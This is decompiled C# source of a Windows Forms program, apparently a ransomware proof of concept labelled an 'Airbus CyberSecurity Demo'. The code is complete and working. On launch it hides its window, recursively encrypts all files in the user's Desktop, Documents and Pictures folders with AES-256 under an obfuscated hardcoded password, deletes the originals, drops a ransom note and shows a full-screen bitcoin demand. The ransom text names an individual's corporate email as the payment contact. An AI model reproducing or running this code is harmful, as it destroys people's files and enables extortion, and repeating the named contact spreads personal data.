using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace ranmPOC;

public class Form1 : Form
{
	private const bool dEL_origi = true;

	private const bool eNc_dEsk = true;

	private const bool eNc_doC = true;

	private const bool eNc_pIC = true;

	private const string eNc_FL_ext = ".brutusptCrypt";

	private static string eNc_PsW = Encoding.UTF8.GetString(Convert.FromBase64String(r_string("=M0RJBnQaZHdFFVIlQHc180N2hFWjhFVOBDS0RFeTpSWUNiMvlmRjNlT5oyc2cGdMdDM")));

	private const string bit_ADD = "1u8h3u23h3jCyb3r22mer97ptPSi12am1143";

	private const string BIT_ran_AMT = "1";

	private const string eMaiL = "francisco.henriques@airbus.com";

	private static string EnC_L = "";

	private string leTTeR = "All of your files have been encrypted.\n\nTo unlock them, please send 1 bitcoin(s) to our BTC address: 1u8h3u23h3jCyb3r22mer97ptPSi12am1143\nAfter proceeding the payment, please email us with your transaction ID to: francisco.henriques@airbus.com\n\nAirbus Cybersecurity wishes u a nice day! ;) \n\nEncrypted files:\n----------------------------------------\n";

	private string deSK_FL = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string dOC_FL = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string piC_FL = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int enc_FL_COU = 0;

	private IContainer components;

	private Label lblCount;

	private Label lblBitcoinAmount;

	private Label label2;

	private TextBox txtBitcoinAddress;

	private TextBox txtEmailAddress;

	private Label label3;

	private PictureBox pictureBox1;

	private Label label5;

	public static string r_string(string str)
	{
		string text = string.Empty;
		for (int num = str.Length - 1; num >= 0; num--)
		{
			text += str[num];
		}
		return text;
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Fm1_LD(object sender, EventArgs e)
	{
		init_FM();
		encFL_cont(deSK_FL);
		encFL_cont(piC_FL);
		encFL_cont(dOC_FL);
		if (enc_FL_COU > 0)
		{
			fmPOST_enc();
			dpRAN_LT();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void dpRAN_LT()
	{
		StreamWriter streamWriter = new StreamWriter(deSK_FL + "\\Payment_Instructions.brutusptCrypt.txt");
		streamWriter.WriteLine(leTTeR);
		streamWriter.WriteLine(EnC_L);
		streamWriter.Close();
	}

	private void fmPOST_enc()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)lblCount).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("WW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkIQ==")));
	}

	private void init_FM()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)lblBitcoinAmount).set_Text("Please send 1" + Encoding.UTF8.GetString(Convert.FromBase64String("Qml0Y29pbihzKSB0byB0aGUgZm9sbG93aW5nIEJUQyBhZGRyZXNz")));
		((Control)txtBitcoinAddress).set_Text("1u8h3u23h3jCyb3r22mer97ptPSi12am1143");
		((Control)txtEmailAddress).set_Text("francisco.henriques@airbus.com");
		((Control)lblBitcoinAmount).Focus();
	}

	private static void encFL_cont(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".brutusptCrypt"))
				{
					FL_enc(text, eNc_PsW);
				}
			}
			files = Directory.GetDirectories(sDir);
			for (int i = 0; i < files.Length; i++)
			{
				encFL_cont(files[i]);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FL_enc(string inPUT_fl, string pssw)
	{
		byte[] array = SALt_bae();
		FileStream fileStream = new FileStream(inPUT_fl + ".brutusptCrypt", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(pssw);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inPUT_fl, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			EnC_L = EnC_L + inPUT_fl + "\n";
			enc_FL_COU++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inPUT_fl);
		}
	}

	public static byte[] SALt_bae()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	private void lblCount_Click(object sender, EventArgs e)
	{
	}

	private void label5_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_01f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fc: Expected O, but got Unknown
		//IL_0292: Unknown result type (might be due to invalid IL or missing references)
		//IL_029c: Expected O, but got Unknown
		//IL_0330: Unknown result type (might be due to invalid IL or missing references)
		//IL_033a: Expected O, but got Unknown
		//IL_03cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d9: Expected O, but got Unknown
		//IL_046d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0477: Expected O, but got Unknown
		//IL_04fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0506: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		lblCount = new Label();
		lblBitcoinAmount = new Label();
		label2 = new Label();
		txtBitcoinAddress = new TextBox();
		txtEmailAddress = new TextBox();
		label3 = new Label();
		pictureBox1 = new PictureBox();
		label5 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lblCount).set_Anchor((AnchorStyles)14);
		((Control)lblCount).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCount).set_ForeColor(Color.White);
		((Control)lblCount).set_Location(new Point(12, 425));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(914, 55));
		((Control)lblCount).set_TabIndex(0);
		((Control)lblCount).set_Text("Ups...All your files have been encrypted!");
		lblCount.set_TextAlign((ContentAlignment)32);
		((Control)lblCount).add_Click((EventHandler)lblCount_Click);
		((Control)lblBitcoinAmount).set_Anchor((AnchorStyles)14);
		((Control)lblBitcoinAmount).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblBitcoinAmount).set_ForeColor(Color.White);
		((Control)lblBitcoinAmount).set_Location(new Point(12, 567));
		((Control)lblBitcoinAmount).set_Name("lblBitcoinAmount");
		((Control)lblBitcoinAmount).set_Size(new Size(914, 55));
		((Control)lblBitcoinAmount).set_TabIndex(1);
		((Control)lblBitcoinAmount).set_Text("Please send n Bitcoin(s) to the following BTC address:");
		lblBitcoinAmount.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_Anchor((AnchorStyles)14);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(21, 672));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(914, 55));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Next up, E-mail your transaction ID to the following address:");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)txtBitcoinAddress).set_Anchor((AnchorStyles)2);
		((Control)txtBitcoinAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtBitcoinAddress).set_Location(new Point(136, 625));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(677, 44));
		((Control)txtBitcoinAddress).set_TabIndex(3);
		((Control)txtBitcoinAddress).set_Text("1u8h3u23h3jCyb3r22mer97ptPSi12am1143");
		txtBitcoinAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)txtEmailAddress).set_Anchor((AnchorStyles)2);
		((Control)txtEmailAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmailAddress).set_Location(new Point(136, 730));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((TextBoxBase)txtEmailAddress).set_ReadOnly(true);
		((Control)txtEmailAddress).set_Size(new Size(677, 44));
		((Control)txtEmailAddress).set_TabIndex(4);
		((Control)txtEmailAddress).set_Text("francisco.henriques@airbus.com");
		txtEmailAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)label3).set_Anchor((AnchorStyles)14);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(12, 480));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(914, 87));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("But don't worry, you can recover them :)");
		label3.set_TextAlign((ContentAlignment)2);
		((Control)pictureBox1).set_Anchor((AnchorStyles)15);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(284, 36));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(343, 386));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(6);
		pictureBox1.set_TabStop(false);
		((Control)label5).set_Anchor((AnchorStyles)14);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(12, 777));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(914, 71));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text("Airbus CyberSecurity wishes u a nice day ;)");
		label5.set_TextAlign((ContentAlignment)32);
		((Control)label5).add_Click((EventHandler)label5_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.MediumSeaGreen);
		((Form)this).set_ClientSize(new Size(938, 857));
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinAmount);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)6);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Airbus CyberSecurity Demo");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Fm1_LD);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
